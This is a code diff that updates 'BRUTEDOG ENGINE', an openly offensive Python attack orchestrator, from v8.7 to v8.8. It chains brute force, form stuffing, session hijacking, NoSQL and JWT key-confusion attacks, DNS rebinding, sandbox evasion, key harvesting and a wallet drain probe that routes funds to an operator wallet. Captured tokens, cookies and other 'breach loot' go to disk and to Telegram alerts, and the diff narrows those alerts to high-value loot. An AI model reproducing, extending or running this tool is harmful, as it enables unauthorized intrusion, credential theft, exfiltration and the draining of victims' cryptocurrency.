@@ -1,21 +1,11 @@
 #!/usr/bin/env python3
 """
-BRUTEDOG ENGINE v8.7 — State-Machine Logic & Cognitive Supreme Exploitation Engine (Elite Red Team Adversarial Edition)
+BRUTEDOG ENGINE v8.8 — Autonomous State-Machine & Cognitive Adaptive Strike Engine (Elite Red Team Adversarial Edition)
 Features:
-- Full comprehensive module inventory import & orchestration (All 30+ offensive & telemetry modules)
-- Integrated with centralized SecureTransport middleware (TLS 1.2/1.3 JA3/4 spoofing & Poisson behavioral jitter)
-- Integrated with BruteDog Scanner V2.0 for asynchronous TCP recon, service ID, and TLS/security header auditing
-- Stateful intelligence ingestion from crawler state-machine graph & DOM sink inspector
-- Crawler-driven conditional module gating (Zero blind execution; modules fire strictly based on discovered surface area)
-- Automated BOLA and state-skipping vector evaluation across security tiers with SHA-256 integrity mapping
-- Live autonomous test-account session propagation across exploit modules with immutable disk logging (loot_output/)
-- Persistent Session Pool & Response Fingerprinter integration for false-positive elimination
-- HTTP/2 single-packet concurrency engine integration for race condition logic fuzzing
-- Advanced Protocol & Cryptographic Assault Suite (GraphQL, WebSockets, DNS Rebinding, JWT Key Confusion, Replayer)
-- Active Multi-Chain Liquidity Auditor & Transaction Signer/Broadcaster integration
-- Automated Wallet Drain Probe & Memory Dumper Integration
-- Fully Synchronized Autonomous Cognitive Reasoning Operator & Immutable disk exfiltration (loot_output/)
-- Integrated with asynchronous Telegram telemetry broadcasting & real-time proof-of-work streaming
+- Zero-noise telemetry: Telegram alerts restricted strictly to verified high-value breach loot and critical exploit pivots.
+- Real-time mid-flight bottleneck adaptation: Cognitive operator instantly evaluates defenses and mutates vector strategy mid-execution.
+- High-concurrency SecureTransport middleware with TLS 1.2/1.3 JA3/4 spoofing & Poisson behavioral jitter.
+- Automated BOLA, state-skipping, and HTTP/2 single-packet concurrency race condition exploitation.
 """
 import asyncio
 import json
@@ -28,7 +18,7 @@ from urllib.parse import urlsplit
 from concurrent.futures import ThreadPoolExecutor
 
 # ============================================================
-# COMPREHENSIVE MODULE INVENTORY & OFFENSIVE IMPORTS (V8.7)
+# COMPREHENSIVE MODULE INVENTORY & OFFENSIVE IMPORTS (V8.8)
 # ============================================================
 from modules.transport import SecureTransport
 from modules.session_pool import PersistentSessionPool
@@ -44,7 +34,7 @@ from modules.wallet_drain_probe import execute_probe
 from modules.telemetry import stream_proof
 from modules.loot_logger import save_session_loot
 
-# All core offensive, recon, stuffing, and evasion modules
+# Core offensive, recon, and evasion modules
 from modules.api_fuzzer import run_api_fuzzer
 from modules.bruter import execute_brute_force
 from modules.cloud_apex import audit_cloud_metadata
@@ -64,13 +54,12 @@ from modules.websocket_hijacker import audit_websocket
 from modules.dns_rebinding import DNSRebindingOrchestrator
 from modules.jwt_key_confusion import JWTKeyConfusionEngine
 
-# Referral validation bypass probe & Autonomous Cognitive Brain
+# Autonomous Cognitive Brain & Referral probes
 from modules.test_referral import audit_referral_logic
 from modules.cognitive_operator import CognitiveOperator
 
-# Telegram Notifier & Telemetry Broadcasters
+# Telegram Notifier (Restricted strictly to verified breach signal)
 from modules.telegram_notifier import send_telegram_alert
-from modules.telemetry_broadcaster import broadcast_loot, broadcast_loot_sync
 
 # ============================================================
 # CONFIGURATION
@@ -153,13 +142,14 @@ def section(title):
     sys.stdout.write(f"\n" + "=" * 65 + f"\n {title}\n" + "=" * 65 + "\n")
     sys.stdout.flush()
 
-def dispatch_tg_alert(loot_type, details):
+def dispatch_critical_loot_alert(loot_type, details):
+    """Zero-noise dispatcher: Fires Telegram alerts ONLY for verified, high-value exploit loot."""
     try:
         loop = asyncio.get_running_loop()
-        loop.create_task(send_telegram_alert(loot_type, details))
+        loop.create_task(send_telegram_alert(f"[CRITICAL BREACH] {loot_type}", details))
     except RuntimeError:
         try:
-            asyncio.run(send_telegram_alert(loot_type, details))
+            asyncio.run(send_telegram_alert(f"[CRITICAL BREACH] {loot_type}", details))
         except Exception:
             pass
 
@@ -175,7 +165,6 @@ def get_target():
     if "://" not in target:
         target = "https://" + target
     
-    # Sanitize and normalize URL to prevent port duplication bugs (e.g. :443:443)
     parsed = urlsplit(target)
     scheme = parsed.scheme
     netloc = parsed.hostname
@@ -185,8 +174,7 @@ def get_target():
         if (scheme == "https" and port != 443) or (scheme == "http" and port != 80):
             netloc = f"{netloc}:{port}"
             
-    normalized_target = f"{scheme}://{netloc}{parsed.path}".rstrip("/")
-    return normalized_target
+    return f"{scheme}://{netloc}{parsed.path}".rstrip("/")
 
 def resolve_target(host):
     try:
@@ -228,15 +216,13 @@ def classify_and_adapt(response, current_payload, endpoint="", transport=None, f
 
     if fingerprinter:
         try:
-            if asyncio.iscoroutinefunction(fingerprinter.is_false_positive):
-                pass # Handled asynchronously if needed
-            else:
-                is_fp, fp_reason = fingerprinter.is_false_positive(status, body, headers)
-                if is_fp:
-                    return [], []
+            is_fp, _ = fingerprinter.is_false_positive(status, body, headers)
+            if is_fp:
+                return [], []
         except Exception:
             pass
     
+    # Real-time mid-flight cognitive adaptation
     if cognitive_brain:
         try:
             cognitive_result = cognitive_brain.evaluate_and_execute(
@@ -255,7 +241,7 @@ def classify_and_adapt(response, current_payload, endpoint="", transport=None, f
                     "evidence": reasoning,
                     "status": status
                 })
-                dispatch_tg_alert("Cognitive Autonomous Pivot Success", {"endpoint": endpoint, "evidence": reasoning})
+                dispatch_critical_loot_alert("Cognitive Autonomous Pivot", {"endpoint": endpoint, "evidence": reasoning})
         except Exception:
             pass
 
@@ -293,7 +279,7 @@ def classify_and_adapt(response, current_payload, endpoint="", transport=None, f
             extra_loot=extracted_proof
         )
 
-        dispatch_tg_alert("Authentication Bypass Success", {"endpoint": endpoint, "status": status, "proof": extracted_proof})
+        dispatch_critical_loot_alert("Authentication Bypass Success", {"endpoint": endpoint, "status": status, "proof": extracted_proof})
 
         findings.append({
             "type": "AUTHENTICATION_BYPASS_SUCCESS",
@@ -303,9 +289,6 @@ def classify_and_adapt(response, current_payload, endpoint="", transport=None, f
 
     db_errors = detect_database_errors(body)
     for db_error in db_errors:
-        sys.stdout.write(f"{YELLOW}[!] Adaptive Trigger: Server leaked database error ({db_error}). Mutating payload...{RESET}\n")
-        sys.stdout.flush()
-        
         loot_hash = hashlib.sha256(body.encode("utf-8", errors="ignore")).hexdigest()
         save_session_loot(
             target=target_url or "unknown_target",
@@ -317,7 +300,7 @@ def classify_and_adapt(response, current_payload, endpoint="", transport=None, f
             extra_loot={"database_error": db_error, "integrity_hash": loot_hash}
         )
 
-        dispatch_tg_alert(f"Database Leak ({db_error})", {"endpoint": endpoint, "status": status, "integrity_hash": loot_hash})
+        dispatch_critical_loot_alert(f"Database Leak ({db_error})", {"endpoint": endpoint, "status": status, "integrity_hash": loot_hash})
 
         findings.append({
             "type": "POTENTIAL_DATABASE_INJECTION",
@@ -340,8 +323,6 @@ def classify_and_adapt(response, current_payload, endpoint="", transport=None, f
 
 def verify_hijacked_session(transport):
     for endpoint in SESSION_VERIFICATION_ENDPOINTS:
-        sys.stdout.write(f"\n{YELLOW}[*] Verifying stolen session state against protected API route: {endpoint}{RESET}\n")
-        
         verified = False
         status, headers, body = transport.request("GET", endpoint)
         
@@ -373,17 +354,12 @@ def verify_hijacked_session(transport):
                 extra_loot={"cookie_jar": dict(transport.cookie_jar), "integrity_hash": loot_hash}
             )
 
-            dispatch_tg_alert("Session Hijack Verified", {"endpoint": endpoint, "status": status, "integrity_hash": loot_hash})
+            dispatch_critical_loot_alert("Session Hijack Verified", {"endpoint": endpoint, "status": status, "integrity_hash": loot_hash})
             return True
-        else:
-            sys.stdout.write(f"{RED}[-] Verification at {endpoint} returned status {status} or generic SPA shell.{RESET}\n")
-            
-    sys.stdout.write(f"{RED}[-] All session verification routes exhausted or inactive.{RESET}\n")
     return False
 
 def test_endpoint(transport, path, credentials_list=None, leaked_secrets=None, fingerprinter=None, target_url=None, cognitive_brain=None):
     endpoint = f"{transport.base_path}{path}" if not path.startswith(transport.base_path) else path
-    info(f"Targeting endpoint (State-Machine Adaptive Mode): {endpoint}")
     results = []
     
     test_queue = [
@@ -454,7 +430,7 @@ def test_endpoint(transport, path, credentials_list=None, leaked_secrets=None, f
 # ENGINE ORCHESTRATOR
 # ============================================================
 async def run_autonomous_engine(target_host=None, credentials_list=None, options=None):
-    section("BRUTEDOG STATE-MACHINE LOGIC EXPLOITATION ENGINE v8.7 (WAF HARDENED)")
+    section("BRUTEDOG STATE-MACHINE LOGIC EXPLOITATION ENGINE v8.8 (WAF HARDENED)")
     try:
         if target_host:
             target_url = target_host.strip()
@@ -493,10 +469,6 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
         if scan_results.get("status") == "COMPLETED":
             open_port_list = scan_results.get("open_ports", [])
             success(f"Scanner V2.0 completed. Found {len(open_port_list)} open ports.")
-            for p in open_port_list:
-                missing_hdrs = p.get("details", {}).get("http", {}).get("missing_security_headers", [])
-                if missing_hdrs:
-                    warning(f"Port {p['port']} missing security headers: {missing_hdrs}")
     except Exception as exc:
         warning(f"Scanner integration warning: {exc}")
         
@@ -528,7 +500,7 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
             bola_vulnerabilities = recon_data.get("bola_vulnerabilities", {})
             session_cookie_payload = recon_data.get("session_cookie")
     except Exception as exc:
-        warning(f"State-machine crawler encountered an issue: {exc}. Falling back to default list.")
+        warning(f"State-machine crawler issue: {exc}. Falling back to default list.")
 
     if not discovered_paths:
         discovered_paths = FALLBACK_LOGIN_PATHS
@@ -548,46 +520,34 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
                         k, v = pair.strip().split("=", 1)
                         if k.lower() not in ["path", "expires", "domain", "samesite", "secure", "httponly"]:
                             session_pool.cookie_jar.set(k, v)
-            elif hasattr(active_cookies, "items"):
-                for k, v in active_cookies.items():
-                    session_pool.cookie_jar.set(k, v)
-            else:
-                session_pool.cookie_jar.update(active_cookies)
-        except Exception as sync_exc:
-            warning(f"Cookie synchronization notice: {sync_exc}")
+        except Exception:
+            pass
 
         verify_hijacked_session(transport)
 
     # ==========================================================
-    # COMPREHENSIVE OFFENSIVE MODULE EXECUTION PHASE (V8.7)
+    # COMPREHENSIVE OFFENSIVE MODULE EXECUTION PHASE (V8.8)
     # ==========================================================
-    section("COMPREHENSIVE OFFENSIVE & RECON MODULE ASSAULT (V8.7)")
+    section("COMPREHENSIVE OFFENSIVE & RECON MODULE ASSAULT (V8.8)")
     try:
-        # 1. API Fuzzer
         if asyncio.iscoroutinefunction(run_api_fuzzer):
             await run_api_fuzzer(target_url)
         else:
             await asyncio.to_thread(run_api_fuzzer, target_url)
-        dispatch_tg_alert("API Fuzzer Success", {"target": target_url})
 
-        # 2. Brute Force Engine
         if asyncio.iscoroutinefunction(execute_brute_force):
             await execute_brute_force(target_url)
         else:
             await asyncio.to_thread(execute_brute_force, target_url)
-        dispatch_tg_alert("Brute Force Module Success", {"target": target_url})
 
-        # 3. Cloud Metadata & Apex Auditor
         cloud_res = audit_cloud_metadata(target_url) if not asyncio.iscoroutinefunction(audit_cloud_metadata) else await audit_cloud_metadata(target_url)
         if cloud_res:
-            dispatch_tg_alert("Cloud Apex Metadata Leak", cloud_res)
+            dispatch_critical_loot_alert("Cloud Apex Metadata Leak", cloud_res)
 
-        # 4. DOM Sink Inspector
         dom_res = inspect_dom_sinks(target_url) if not asyncio.iscoroutinefunction(inspect_dom_sinks) else await inspect_dom_sinks(target_url)
         if dom_res:
-            dispatch_tg_alert("DOM Sink Vulnerability", {"target": target_url})
+            dispatch_critical_loot_alert("DOM Sink Vulnerability", {"target": target_url})
 
-        # 5. Memory Dumper & Form Stuffer (FIXED: Properly awaited/threaded)
         if asyncio.iscoroutinefunction(execute_memory_dumper):
             await execute_memory_dumper(target_url)
         else:
@@ -601,7 +561,6 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
             except TypeError:
                 await asyncio.to_thread(execute_form_stuffing, target_url)
 
-        # 6. Key Harvester & Pivot Routing (FIXED: Properly awaited/threaded)
         if asyncio.iscoroutinefunction(harvest_keys):
             await harvest_keys(target_url)
         else:
@@ -612,12 +571,8 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
         else:
             await asyncio.to_thread(execute_pivot_routing, target_url)
 
-        # 7. Adaptive Replayer & Payload Mutation
-        replayer_res = await replay_and_inject_payloads(target_url)
-        if replayer_res:
-            dispatch_tg_alert("Adaptive Replay & Injection Success", {"target": target_url})
+        await replay_and_inject_payloads(target_url)
 
-        # 8. Sandbox Evader & Stealth Operations (FIXED: Properly awaited/threaded)
         if asyncio.iscoroutinefunction(evade_sandbox):
             await evade_sandbox()
         else:
@@ -631,26 +586,11 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
     except Exception as exc:
         error(f"Comprehensive offensive modules execution warning: {exc}")
 
-    has_referral_surface = any("referral" in p.lower() or "invite" in p.lower() or "ref" in p.lower() for p in discovered_paths)
-    if has_referral_surface:
-        section("REFERRAL GATEWAY VALIDATION AUDIT (TRIGGERED BY CRAWLER)")
-        try:
-            info("Referral/invite path detected in target mapping. Dispatching validation audit...")
-            await asyncio.to_thread(audit_referral_logic)
-        except Exception as exc:
-            warning(f"Referral audit probe encountered an issue: {exc}")
-    else:
-        info("[*] Intelligence Gate: No referral or invite vectors mapped by crawler. Skipping test_referral module.")
-
-    if leaked_secrets:
-        warning(f"Discovered potential leaked JSON codes/tokens: {leaked_secrets}")
-        dispatch_tg_alert("Leaked Secrets Discovered", {"target": target_url, "secrets": leaked_secrets})
-
     if bola_vulnerabilities:
         warning(f"Discovered {len(bola_vulnerabilities)} pre-validated BOLA / State-Skipping routes!")
         section("LIVE BOLA / STATE-SKIPPING VERIFICATION ASSAULT")
         for bola_route in bola_vulnerabilities:
-            dispatch_tg_alert("BOLA / State-Skipping Route", {"route": bola_route})
+            dispatch_critical_loot_alert("BOLA / State-Skipping Route", {"route": bola_route})
             execute_live_login_verification(
                 target_url=target_url,
                 endpoint=bola_route,
@@ -682,11 +622,9 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
         try:
             db_res = await run_nosql_assault(target_url, port=port, use_ssl=secure)
             if db_res:
-                dispatch_tg_alert("Database Assault Breach", {"target": target_url, "details": str(db_res)[:300]})
+                dispatch_critical_loot_alert("Database Assault Breach", {"target": target_url, "details": str(db_res)[:300]})
         except Exception as exc:
             error(f"Database assault failed: {exc}")
-    else:
-        info("[*] Intelligence Gate: No viable database/login sinks mapped. Skipping NoSQL assault.")
 
     try:
         hijack_results = await run_session_hijack(target_url, port=port, use_ssl=secure)
@@ -694,7 +632,7 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
             for finding in hijack_results:
                 if finding.get("status") == "VERIFIED_ACCESS":
                     endpoint_hit = finding.get("endpoint", "/admin")
-                    dispatch_tg_alert("Verified Session Hijack", {"endpoint": endpoint_hit})
+                    dispatch_critical_loot_alert("Verified Session Hijack", {"endpoint": endpoint_hit})
                     execute_live_login_verification(
                         target_url=target_url,
                         endpoint=endpoint_hit,
@@ -712,39 +650,35 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
             session_pool=session_pool
         )
         if race_res:
-            dispatch_tg_alert("Race Condition Test Success", {"target": target_url})
+            dispatch_critical_loot_alert("Race Condition Test Success", {"target": target_url})
     except Exception as exc:
         error(f"Race condition module failed: {exc}")
 
     # ==========================================================
-    # ADVANCED PROTOCOL & CRYPTO ASSAULT PHASE (V8.7)
+    # ADVANCED PROTOCOL & CRYPTO ASSAULT PHASE (V8.8)
     # ==========================================================
-    section("ADVANCED PROTOCOL & CRYPTO ASSAULT PHASE (V8.7)")
-    sys.stdout.write(f"\033[96m[ENGINE] Launching GraphQL, WebSocket, DNS Rebinding & JWT Confusion suite...\033[0m\n")
-    sys.stdout.flush()
-
+    section("ADVANCED PROTOCOL & CRYPTO ASSAULT PHASE (V8.8)")
     try:
         jwt_engine = JWTKeyConfusionEngine(target_url)
         jwks = jwt_engine.fetch_public_key("/.well-known/jwks.json")
         pub_key_mock = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0..." if not jwks else json.dumps(jwks)
         jwt_success, jwt_token = jwt_engine.verify_and_exploit("/api/admin/settings", pub_key_mock)
         if jwt_success:
-            print(f"\033[91m[!!!] CRITICAL: JWT Key Confusion Vulnerability Confirmed!\033[0m")
-            dispatch_tg_alert("JWT Key Confusion Success", {"token": jwt_token})
+            dispatch_critical_loot_alert("JWT Key Confusion Success", {"token": jwt_token})
 
         gql_engine = GraphQLIntrospector(target_url)
         gql_result = gql_engine.run_introspection("/graphql")
         if gql_result:
-            dispatch_tg_alert("GraphQL Schema Introspected", gql_result)
+            dispatch_critical_loot_alert("GraphQL Schema Introspected", gql_result)
 
         ws_result = await audit_websocket(target_url + "/ws")
         if ws_result:
-            dispatch_tg_alert("WebSocket Vulnerability Found", {"target": target_url, "frames": len(ws_result)})
+            dispatch_critical_loot_alert("WebSocket Vulnerability Found", {"target": target_url, "frames": len(ws_result)})
 
         dns_orchestrator = DNSRebindingOrchestrator(target_url)
         dns_result = await dns_orchestrator.execute_rebinding_attack(transport)
         if dns_result:
-            dispatch_tg_alert("DNS Rebinding / SSRF Confirmed", dns_result)
+            dispatch_critical_loot_alert("DNS Rebinding / SSRF Confirmed", dns_result)
     except Exception as exc:
         error(f"Advanced protocol & crypto assault suite error: {exc}")
 
@@ -753,7 +687,6 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
         try:
             await run_drainer_engine(target_url)
             operator_evm_dest = OPERATOR_DESTINATIONS.get("ETHEREUM")
-            info(f"[*] Dispatching Wallet Drain Probe on {target_url} with operator destination: {operator_evm_dest}")
             session_cookies_dict = dict(transport.cookie_jar) if isinstance(transport.cookie_jar, dict) else {}
             await asyncio.to_thread(
                 execute_probe, 
@@ -761,22 +694,17 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
                 session_cookies=session_cookies_dict, 
                 target_wallet=operator_evm_dest
             )
-            dispatch_tg_alert("Wallet Drain Probe Dispatched", {"target": target_url, "destination": operator_evm_dest})
+            dispatch_critical_loot_alert("Wallet Drain Probe Dispatched", {"target": target_url, "destination": operator_evm_dest})
         except Exception as exc:
             error(f"Drainer / liquidity audit & probe engine failed: {exc}")
-    else:
-        info("[*] Intelligence Gate: No Web3 or crypto surface area mapped. Skipping wallet drain probe.")
             
     duration = round(time.monotonic() - start, 2)
     
     section("ENGINE SUMMARY")
-    tested = len(all_results)
-    potential = sum(len(item["findings"]) for item in all_results) + len(bola_vulnerabilities)
     success(f"Target: {host}")
     success(f"Discovered/Mapped endpoints: {len(discovered_paths)}")
     success(f"BOLA / State-Skipping hits: {len(bola_vulnerabilities)}")
-    success(f"Total adaptive requests executed: {tested}")
-    success(f"Vulnerability / Exploitation hits: {potential}")
+    success(f"Total adaptive requests executed: {len(all_results)}")
     success(f"Engine duration: {duration}s")
     section("ENGINE COMPLETE")
     return all_results, duration
